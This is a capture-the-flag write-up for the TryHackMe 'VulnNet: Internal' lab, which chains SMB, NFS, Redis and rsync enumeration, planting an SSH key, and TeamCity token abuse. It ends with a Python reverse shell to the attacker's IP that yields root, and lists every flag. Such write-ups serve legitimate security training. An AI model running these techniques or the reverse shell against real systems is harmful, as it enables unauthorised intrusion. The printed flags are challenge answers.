## VulnNet: Internal - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/vulnnetinternal)

VulnNet Entertainment is a company that learns from its mistakes. They quickly realized that they can't make a properly secured web application so they gave up on that idea. 
Instead, they decided to set up internal services for business purposes. As usual, you're tasked to perform a penetration test of their network and report your findings.

    Difficulty: Easy/Medium
    Operating System: Linux

This machine was designed to be quite the opposite of the previous machines in this series and it focuses on internal services. 
It's supposed to show you how you can retrieve interesting information and use it to gain system access. 
Report your findings by submitting the correct flags.

Note: It might take 3-5 minutes for all the services to boot.

Icon made by Freepik from www.flaticon.com

**IP: 10.10.255.144**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy / Medium   <br>

**Room Type**: Linux Privilege Escalation, Enumeration <br>

**Tools Used**: Nmap, enum4linux<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration & Enumeration & Enumeration

- This room is pure enumeration challenge, start with Nmap scan.

  ```
  nmap -sC -sV -T5 -p- 10.10.255.144

  PORT      STATE    SERVICE     VERSION
  22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
  |   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
  |_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
  111/tcp   open     rpcbind     2-4 (RPC #100000)
  | rpcinfo: 
  |   program version    port/proto  service
  |   100000  2,3,4        111/tcp   rpcbind
  |   100000  2,3,4        111/udp   rpcbind
  |   100000  3,4          111/tcp6  rpcbind
  |   100000  3,4          111/udp6  rpcbind
  |   100003  3           2049/udp   nfs
  |   100003  3           2049/udp6  nfs
  |   100003  3,4         2049/tcp   nfs
  |   100003  3,4         2049/tcp6  nfs
  |   100005  1,2,3      43760/udp6  mountd
  |   100005  1,2,3      44577/tcp   mountd
  |   100005  1,2,3      45761/tcp6  mountd
  |   100005  1,2,3      58682/udp   mountd
  |   100021  1,3,4      33705/tcp6  nlockmgr
  |   100021  1,3,4      41046/udp   nlockmgr
  |   100021  1,3,4      41847/tcp   nlockmgr
  |   100021  1,3,4      51773/udp6  nlockmgr
  |   100227  3           2049/tcp   nfs_acl
  |   100227  3           2049/tcp6  nfs_acl
  |   100227  3           2049/udp   nfs_acl
  |_  100227  3           2049/udp6  nfs_acl
  139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp   open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
  873/tcp   open     rsync       (protocol version 31)
  2049/tcp  open     nfs         3-4 (RPC #100003)
  6379/tcp  open     redis       Redis key-value store
  9090/tcp  filtered zeus-admin
  32937/tcp open     mountd      1-3 (RPC #100005)
  41847/tcp open     nlockmgr    1-4 (RPC #100021)
  44577/tcp open     mountd      1-3 (RPC #100005)
  60227/tcp open     mountd      1-3 (RPC #100005)
  Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  Host script results:
  |_clock-skew: mean: -39m57s, deviation: 1h09m16s, median: 2s
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  |_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  | smb2-time: 
  |   date: 2025-05-19T18:22:32
  |_  start_date: N/A
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required
  | smb-os-discovery: 
  |   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
  |   Computer name: vulnnet-internal
  |   NetBIOS computer name: VULNNET-INTERNAL\x00
  |   Domain name: \x00
  |   FQDN: vulnnet-internal
  |_  System time: 2025-05-19T20:22:32+02:00
  ```
  
- Now get ready for enumeration training. First we do Samba on ports 139, 445 with `enum4linux`

  ```
  enum4linux -a 10.10.255.144

   =================================( Share Enumeration on 10.10.255.144 )=================================
  
  
          Sharename       Type      Comment
          ---------       ----      -------
          print$          Disk      Printer Drivers
          shares          Disk      VulnNet Business Shares
          IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
  Reconnecting with SMB1 for workgroup listing.
  
          Server               Comment
          ---------            -------
  
          Workgroup            Master
          ---------            -------
          WORKGROUP            
  
  
  [+] Attempting to map shares on 10.10.255.144
  
  //10.10.255.144/print$  Mapping: DENIED Listing: N/A Writing: N/A
  //10.10.255.144/shares  Mapping: OK Listing: OK Writing: N/A
  
  [E] Can't understand response:
  
  NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
  //10.10.255.144/IPC$    Mapping: N/A Listing: N/A Writing: N/A
  ```
  
- Now let's login and see what's there. Download all the files you find. Press Enter when prompted for password.

  ```
  smbclient //10.10.255.144/shares
  
  smb: \> cd temp
  smb: \temp\> ls
    .                                   D        0  Sat Feb  6 11:45:10 2021
    ..                                  D        0  Tue Feb  2 09:20:09 2021
    services.txt                        N       38  Sat Feb  6 11:45:09 2021
  
  smb: \temp\> mget services.txt
  Get file services.txt? y
  getting file \temp\services.txt of size 38 as services.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
  
  smb: \> cd data
  smb: \data\> ls
    .                                   D        0  Tue Feb  2 09:27:33 2021
    ..                                  D        0  Tue Feb  2 09:20:09 2021
    data.txt                            N       48  Tue Feb  2 09:21:18 2021
    business-req.txt                    N      190  Tue Feb  2 09:27:33 2021
  
                  11309648 blocks of size 1024. 3278536 blocks available
  smb: \data\> mget data.txt
  Get file data.txt? y
  getting file \data\data.txt of size 48 as data.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
  smb: \data\> mget business-req.txt 
  Get file business-req.txt? y
  getting file \data\business-req.txt of size 190 as business-req.txt (0.6 KiloBytes/sec) (average 0.3 KiloBytes/sec)
  ```

- Read newly found files.

  ```
  cat services.txt 
  THM{0a09d51e488f5fa105d8d866a497440a}
  
  cat data.txt           
  Purge regularly data that is not needed anymore
  
  cat business-req.txt   
  We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
  If you have any questions, please text or phone us.
  ```

- OK, first flag done and note tells us to look at the database. RPC enumeration now on port 111.

  ```
  showmount -e 10.10.255.144
  Export list for 10.10.255.144:
  /opt/conf *
  
  mkdir /tmp/mnt 
  sudo mount -t nfs 10.10.255.144:/opt/conf /tmp/mnt
  cd /tmp/mnt
  ls    
  hp  init  opt  profile.d  redis  vim  wildmidi
  ```

- So, I checked everything in NFS mount and found the password in `redis.conf` file.

  ```
  cat redis.conf

  [SNIP!]
  slave-serve-stale-data yes
  
  requirepass "B65Hx562F@ggAZ@F"
  [SNIP!]
  ```

- Cool, since we have Redis password let's enumerate it on port 6379.

  ```
  redis-cli -h 10.10.255.144 -a B65Hx562F@ggAZ@F
  Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
  10.10.255.144:6379> KEYS *
  1) "internal flag"
  2) "int"
  3) "authlist"
  4) "marketlist"
  5) "tmp"
  
  10.10.255.144:6379> GET "internal flag"
  "THM{ff8e518addbbddb74531a724236a8221}"
  
  10.10.255.144:6379> GET int
  "10 20 30 40 50"
  10.10.255.144:6379> GET tmp
  "temp dir..."
  
  10.10.255.144:6379> LRANGE authlist 1 16
  1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
  2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
  3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
  
  10.10.255.144:6379> LRANGE marketlist 1 16
  1) "Penetration Testing"
  2) "Programming"
  3) "Data Analysis"
  4) "Analytics"
  5) "Marketing"
  6) "Media Streaming"
  ```

- Second flag done and another hint found.

  ```
  echo 'QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==' | base64 -d
  Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
  ```

- Now we have Rsync password so let's enumerate that service on port 873. I told ya, full enumeration training with this one. Also, create a directory where you will download the `sys-internal` directory.

  ```
  mkdir rsync
  rsync -av --list-only rsync://10.10.255.144   
  files           Necessary home interaction

  rsync rsync://rsync-connect@10.10.255.144/files
  Password: 
  drwxr-xr-x          4,096 2021/02/01 12:51:14 .
  drwxr-xr-x          4,096 2021/02/06 12:49:29 sys-internal

  rsync -av rsync://rsync-connect@10.10.255.144/files rsync/

  [SNIP!]
  sys-internal/.thumbnails/normal/2b53c68a980e4c943d2853db2510acf6.png
  sys-internal/.thumbnails/normal/473aeca0657907b953403884c53d865c.png
  sys-internal/.thumbnails/normal/539380d1cb60fcd744fd5094d314fdc1.png
  sys-internal/Desktop/
  sys-internal/Documents/
  sys-internal/Downloads/
  sys-internal/Music/
  sys-internal/Pictures/
  sys-internal/Public/
  sys-internal/Templates/
  sys-internal/Videos/
  
  sent 28,056 bytes  received 41,851,891 bytes  3,641,734.52 bytes/sec
  total size is 41,708,382  speedup is 1.00
  ```

- Output is enourmous here but now you have full `sys-internal` directory on your local machine. Go through files/directories and you'll find third flag.

  ```
  cd rsync
  cd sys-internals                                                                                                                  
  cat user.txt   
  THM{da7c20696831f253e0afaca8b83c07ab}
  ```

- Now create a pair of SSH keys since we will need it for logging with SSH.

  ```
  ssh-keygen -t rsa                                 
  Generating public/private rsa key pair.
  [SNIP!]
  
  ls
  Desktop  Documents  Downloads  internals  internals.pub  Music  Pictures  Public  Templates  user.txt  Videos
  
  cat internals.pub | tee authorized_keys && chmod 600 authorized_keys
  ssh-rsa [SNIP!] your@kali
  ```

- Now login with SSH and port-forward server from port 8111 to your local machine.

  ```
  chmod 600 internals

  ssh -i internals -L 8111:127.0.0.1:8111 sys-internal@10.10.255.144
  
  Enter passphrase for key 'internals': 
  Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)
  
  [SNIP!]
  
  Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
  applicable law.
  
  sys-internal@vulnnet-internal:~$ whoami
  sys-internal
  sys-internal@vulnnet-internal:~$ id
  uid=1000(sys-internal) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom)
  ```

- Passphrase is the passphrase you set up when creating pair of keys. Now visit the `http://127.0.0.1:8111/` and you'll see a login page. I tried numerous different option but nothing worked so I did more enumeration lol.

  ```
  sys-internal@vulnnet-internal:/TeamCity$ cd logs
  sys-internal@vulnnet-internal:/TeamCity/logs$ ls -al
  total 464
  drwxr-xr-x  2 root root   4096 May 19 20:20 .
  drwxr-xr-x 12 root root   4096 Feb  6  2021 ..
  -rw-r-----  1 root root  12493 Feb  6  2021 catalina.2021-02-06.log
  -rw-r-----  1 root root   8132 Feb  7  2021 catalina.2021-02-07.log
  -rw-r-----  1 root root   6037 May 19 20:20 catalina.2025-05-19.log
  -rw-r--r--  1 root root 164444 May 19 20:39 catalina.out
  -rw-r-----  1 root root      0 Feb  6  2021 host-manager.2021-02-06.log
  -rw-r-----  1 root root      0 Feb  7  2021 host-manager.2021-02-07.log
  -rw-r-----  1 root root      0 May 19 20:17 host-manager.2025-05-19.log
  -rw-r-----  1 root root      0 Feb  6  2021 localhost.2021-02-06.log
  -rw-r-----  1 root root      0 Feb  7  2021 localhost.2021-02-07.log
  -rw-r-----  1 root root      0 May 19 20:17 localhost.2025-05-19.log
  -rw-r-----  1 root root      0 Feb  6  2021 manager.2021-02-06.log
  -rw-r-----  1 root root      0 Feb  7  2021 manager.2021-02-07.log
  -rw-r-----  1 root root      0 May 19 20:17 manager.2025-05-19.log
  -rw-r-----  1 root root    967 May 19 20:25 teamcity-activities.log
  -rw-r-----  1 root root   2688 May 19 21:20 teamcity-auth.log
  -rw-r-----  1 root root   1272 May 19 20:24 teamcity-cleanup.log
  -rw-r-----  1 root root    374 Feb  6  2021 teamcity-diagnostics.log
  -rw-r-----  1 root root   6978 Feb  6  2021 teamcity-javaLogging-2021-02-06.log
  -rw-r-----  1 root root   3431 Feb  7  2021 teamcity-javaLogging-2021-02-07.log
  -rw-r-----  1 root root   3377 May 19 20:25 teamcity-javaLogging-2025-05-19.log
  -rw-r--r--  1 root root      0 May 19 20:17 teamcity.lock
  -rw-r-----  1 root root   3600 May 19 20:21 teamcity-mavenServer.log
  -rw-r-----  1 root root    156 Feb  7  2021 teamcity-nodes.log
  -rw-r-----  1 root root   1288 May 19 20:22 teamcity-notifications.log
  -rw-r--r--  1 root root      4 May 19 20:18 teamcity.pid
  -rw-r-----  1 root root  19540 May 19 20:24 teamcity-rest.log
  -rw-r-----  1 root root 175699 May 19 21:20 teamcity-server.log
  -rw-r-----  1 root root    784 Feb  7  2021 teamcity-tfs.log
  -rw-r-----  1 root root   2012 May 19 20:25 teamcity-vcs.log
  -rw-r--r--  1 root root    466 May 19 20:17 teamcity-wrapper.log
  -rw-r-----  1 root root    568 May 19 20:20 teamcity-ws.log
  ```

- I checked `TeamCity` directory and found logs inside. On the login page, there is an option to login as Super User without username nor password, just token so I searched for that.

  ```
  sys-internal@vulnnet-internal:/TeamCity/logs$ grep -iR "Token" 2>/dev/null
  catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
  catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
  catalina.out:[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
  catalina.out:[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
  catalina.out:[TeamCity] Super user authentication token: 6299580571815143414 (use empty username with the token as the password to access the server)
  ```

- GOTEM COACH! For me, the last token worked out of these 5. Login to web page and let's get root now.

- So here, create a `New Project, Create Project Manually`, then `Create Build Configuration`, skip VCS Root and then go to `Build Steps`. For both project name and configuration use whatever you like, it doesn't even matter just remember it.
  When you reach `Build Steps`, select Python in first prompt and then select `Custom Script`. In that custom script we put a reverse shell, start a listener and then save the configuration. You should be root on your listener after running it.
  There's a button `Run` in the top right corner. For reverse shell, use Python reverse shell without `python3 -c`

  ```
  import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[YOUR-THM-IP]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

  nc -lvnp 4444                    
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.255.144] 41192
  /bin/sh: 0: can't access tty; job control turned off
  # whoami
  root
  # id
  uid=0(root) gid=0(root) groups=0(root)
  # cat /root/root.txt
  THM{e8996faea46df09dba5676dd271c60bd}
  ```

- Probably the best room I did so far, insanely good, I learned so much and hope you did as well! 💋
---

## 🏁 Flags

- **Service Flag**: `THM{0a09d51e488f5fa105d8d866a497440a}`
- **Internal Flag**: `THM{ff8e518addbbddb74531a724236a8221}`
- **User Flag**: `THM{da7c20696831f253e0afaca8b83c07ab}`
- **Root Flag**: `THM{e8996faea46df09dba5676dd271c60bd}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Getting my way around all of the enumeration.`

- What did I learn?
  `A lot, awesome room, I learned more in this room then in the last 3 months of hacking!`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
